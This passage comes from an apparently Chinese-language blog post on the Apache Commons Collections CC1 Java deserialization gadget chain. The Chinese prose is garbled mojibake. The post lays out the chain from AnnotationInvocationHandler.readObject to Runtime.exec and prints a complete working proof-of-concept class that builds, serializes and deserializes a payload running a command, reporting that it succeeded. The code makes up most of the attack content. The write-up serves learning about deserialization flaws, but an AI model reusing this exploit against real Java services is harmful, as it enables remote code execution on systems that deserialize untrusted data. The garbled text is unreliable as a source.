<p><strong>1.ä¸€ä¸ªå¯¹è±¡æ˜¯æœ¬èº«ç±»çš„ä¸€ä¸ªå¯¹è±¡</strong></p>
<p><strong>2.ä¸€ä¸ªå¯¹è±¡æ˜¯æœ¬èº«ç±»çˆ¶ç±»ï¼ˆçˆ¶ç±»çš„çˆ¶ç±»ï¼‰å’Œæ¥å£ï¼ˆæ¥å£çš„æ¥å£ï¼‰çš„ä¸€ä¸ªå¯¹è±¡</strong></p>
<p><strong>3.æ‰€æœ‰å¯¹è±¡éƒ½æ˜¯Object</strong></p>
<p>4.å‡¡æ˜¯nullæœ‰å…³çš„éƒ½æ˜¯false  null.instanceof(class)</p>
<hr>
<p><strong>class.inInstance(obj)</strong></p>
<p><strong>è¿™ä¸ªå¯¹è±¡èƒ½ä¸èƒ½è¢«è½¬åŒ–ä¸ºè¿™ä¸ªç±»</strong></p>
<p><strong>1.ä¸€ä¸ªå¯¹è±¡æ˜¯æœ¬èº«ç±»çš„ä¸€ä¸ªå¯¹è±¡</strong></p>
<p><strong>2.ä¸€ä¸ªå¯¹è±¡èƒ½è¢«è½¬åŒ–ä¸ºæœ¬èº«ç±»æ‰€ç»§æ‰¿ç±»ï¼ˆçˆ¶ç±»çš„çˆ¶ç±»ç­‰ï¼‰å’Œå®ç°çš„æ¥å£ï¼ˆæ¥å£çš„çˆ¶æ¥å£ï¼‰å¼ºè½¬</strong></p>
<p><strong>3.æ‰€æœ‰å¯¹è±¡éƒ½èƒ½è¢«Objectçš„å¼ºè½¬</strong></p>
<p>4.å‡¡æ˜¯nullæœ‰å…³çš„éƒ½æ˜¯false  class.inInstance(null)</p>
</blockquote>
<p>æ‰€ä»¥åªè¦æ‰¾ä¸€ä¸ª<code> Annotation</code>å­ç±»ï¼Œä¸”valueçš„å€¼æ— æ³•è½¬åŒ–ä¸º<code> Annotation</code>å­ç±»çš„æˆå‘˜æ–¹æ³•ç±»</p>
<p>æ‰¾äº†ä¸ª<code>Attributes</code>æ³¨è§£ç±»</p>
<pre><code class="java">public @interface Attributes &#123;
    StabilityLevel name() default StabilityLevel.PRIVATE;

    StabilityLevel data() default StabilityLevel.PRIVATE;

    DependencyClass dependency() default DependencyClass.UNKNOWN;
&#125;
</code></pre>
<p>å‘ç°ä¸èƒ½è½¬æ¢ï¼Œæ‰€ä»¥å°±ç”¨ä»–äº†</p>
<pre><code class="java">Class a=StabilityLevel.class;
String b=&quot;sss&quot;;
System.out.println(a.isInstance(b));
//false
</code></pre>
<h2 id="æœ€ç»ˆçš„é“¾å­"><a href="#æœ€ç»ˆçš„é“¾å­" class="headerlink" title="æœ€ç»ˆçš„é“¾å­"></a>æœ€ç»ˆçš„é“¾å­</h2><pre><code class="java">sun.reflect.annotation.AnnotationInvocationHandler.readObject()
    -&gt;AbstractInputCheckedMapDecorator.setvalue()
        -&gt;TransformedMap.checkSetValue()
            -&gt;ChainedTransformer.transform()
                -&gt;InvokerTransformer.transform()
                    -&gt;Runtime.exec()
</code></pre>
<p>pop</p>
<pre><code class="java">import com.sun.tracing.dtrace.Attributes;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Annotation;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class cc1_new &#123;
    public static void main(String[] args) throws Exception &#123;
        ChainedTransformer chainTransformer = new ChainedTransformer(new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                new InvokerTransformer(&quot;invoke&quot;,new Class[] &#123;Object.class,Object[].class&#125;,new Object[] &#123;null,null&#125;),
                new InvokerTransformer(&quot;exec&quot;,new Class[] &#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;);
        
        Map&lt;Object,Object&gt; map=new HashMap&lt;&gt;();
        
        map.put(&quot;name&quot;,&quot;v&quot;);
        
        Map&lt;Object,Object&gt; transformermap = TransformedMap.decorate(map,null,chainTransformer);

        Class annotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        
        Constructor constructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);
        
        constructor.setAccessible(true);
        
        Object annotationInvocationHandler  = constructor.newInstance(Attributes.class,transformermap);
        
        System.out.println(annotationInvocationHandler);
        
        serialize(annotationInvocationHandler);
        
        unserialize(&quot;1.bin&quot;);

    &#125;
    public static void serialize(Object obj) throws IOException&#123;
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;1.bin&quot;));
        oos.writeObject(obj);
    &#125;

    public static Object unserialize(String filename) throws Exception&#123;
        ObjectInputStream oip = new ObjectInputStream(new FileInputStream(filename));
        Object obj = oip.readObject();
        return obj;
    &#125;
&#125;
</code></pre>
<p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åœ¨æ‰¾javaçš„ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œåº”è¯¥ä¾æ¬¡æ‰¾</p>
<ul>
<li>å±é™©ç±»é‡å†™readOject()å¤„æ˜¯å¦æœ‰å¯ä»¥ç›´æ¥è¿›æ”»å‡»çš„åœ°æ–¹</li>
<li>æ ¹æ®readOjectè¿›è¡Œå»¶é¡ºï¼Œæ‰¾æ˜¯å¦èƒ½å¤Ÿæ”»å‡»çš„åœ°æ–¹</li>
</ul>
<p>æ„Ÿè§‰javaçš„ååºåˆ—åŒ–æ¯”phpéš¾å¾ˆå¤š</p>
<h1 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h1><ul>
<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=b010ac0d4c5f2fc3933c9e2a24a4ea9f">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXP</a></li>
</ul>

    </div>

    <div class="post-meta">
        <i>
        
            <span>2023-07-03</span>
            
                <span>è¯¥ç¯‡æ–‡ç« è¢« v2ish1yan</span>
            
            
                <span>æ‰“ä¸Šæ ‡ç­¾:
                    
                    
                        <a href='/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
                            ååºåˆ—åŒ–
                        </a>
                    
                </span>
             
             
                <span>å½’ä¸ºåˆ†ç±»:
                    
                    
                        <a href='/categories/Java/'>
                            Java
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    
        
    <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
         
    </div>
    
        

    <div id="waline"></div>
    <script type="module"  >
        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
        function loadWaline() {
            init({
                el: '#waline',
                serverURL: 'https://a4-talk.vercel.app',
                lang: 'zh-CN',
                dark: 'body[class~="dark-mode"]',
                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
                search: false, // ç¦æ­¢è¡¨æƒ…åŒ…æœç´¢
                reaction: false, // å¯¹æ–‡ç« æ‰“åˆ†
                pageview: false, // æµè§ˆé‡ç»Ÿè®¡
                comment: false, // è¯„è®ºæ•°ç»Ÿè®¡

                locale: {
                    placeholder: 'æ¬¢è¿è¯„è®º', 
                    sofa: ''
                },
            });
            
        }
        window.addEventListener('DOMContentLoaded', loadWaline);
    </script>



    
    
    
    </div>


     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            Â© 1949-2024 China 

            
                

            
        </span>
    
</div>
<!--è¿™æ˜¯æŒ‡ä¸€æ¡çº¿å¾€ä¸‹çš„å†…å®¹-->
<div class="footer-last">
    
            <span>ğŸŒŠé¢æœå¤§æµ·ï¼Œæ˜¥æš–èŠ±å¼€ğŸŒ¸</span>
            
                <span class="footer-last-span-right"><i>æœ¬ç«™ç”±<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>é©±åŠ¨ï½œä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>ä¸»é¢˜</i></span>
            
    
</div>


   
    
<script src="/js/highlight.min.js"></script>

    
<script src="/js/highlightjs-line-numbers.js"></script>


    
<script src="/js/randomHeaderContent.js"></script>

    <!--å›åˆ°é¡¶éƒ¨æŒ‰é’®-->
    
        
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

        
<script src="/js/returnToTop.js"></script>

    

    <!--ç›®å½•-->
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
        
<script src="/js/toc.js"></script>

    



<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>



                </div>
            
            
                <!-- å›åˆ°é¡¶éƒ¨çš„æŒ‰é’®-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>


    <!--æš—é»‘æ¨¡å¼-->
    <script src="/js/darkmode-js.min.js"></script>
    <script>
        function addDarkmodeWidget() {
        const options = {
            bottom: '53px', // default: '32px'
            right: 'unset', // default: '32px'
            left: '42px', // default: 'unset'
            time: '0.3s', // default: '0.3s'
            mixColor: '#fff', // default: '#fff'
            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
            buttonColorDark: '#100f2c',  // default: '#100f2c'
            buttonColorLight: '#fff', // default: '#fff'
            saveInCookies: true, // default: true,
            label: 'ğŸŒ“', // default: ''
            autoMatchOsTheme: true // default: true
        }
    
        const darkmode = new Darkmode(options);
        darkmode.showWidget();
        
        }
        window.addEventListener('load', addDarkmodeWidget);
    </script>
  
</html>